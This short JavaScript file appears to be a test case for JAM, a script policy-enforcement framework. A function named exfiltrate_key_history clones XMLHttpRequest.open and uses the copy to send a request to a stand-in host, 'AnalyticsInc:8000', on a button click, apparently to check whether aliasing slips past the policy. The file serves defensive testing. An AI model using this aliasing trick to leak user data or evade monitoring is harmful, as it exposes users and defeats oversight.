
JAM.startProfile('load');
function copy(obj){if("object"!==typeof obj)return obj;var value=obj.valueOf();if(obj!=value)return JAM.new(obj.constructor,[value]);(value=obj instanceof obj.constructor)&&(value=obj.constructor!==Object);if(value){var value=clone(obj.constructor.prototype),property;for(property in obj)if(obj.hasOwnProperty(property)){var v2=value,v3=property,v20=copy(obj[property]);JAM.set(v2,v3,v20)}}else for(property in value={},obj)v2=value,v3=property,v20=copy(obj[property]),JAM.set(v2,v3,v20);return value}
function Clone(){}function clone(obj){Clone.prototype=obj;return new Clone}function exfiltrate_key_history(){var v10=xmlhttp=new XMLHttpRequest,v22=copy(xmlhttp.open);v10.opennew=v22;JAM.call(xmlhttp.opennew,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone5",!0],JAM.policy.p1);xmlhttp.send(null)}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)

JAM.stopProfile('load');
